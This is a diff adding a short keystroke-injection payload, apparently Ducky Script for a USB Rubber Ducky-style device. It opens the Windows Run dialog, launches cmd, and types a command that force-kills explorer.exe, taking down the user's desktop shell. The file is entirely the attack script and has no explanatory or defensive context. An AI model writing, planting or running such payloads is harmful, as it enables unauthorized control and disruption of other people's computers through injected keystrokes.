@@ -1,0 +1,9 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+STRING taskkill /f /im explorer.exe
+DELAY 500
+ENTER
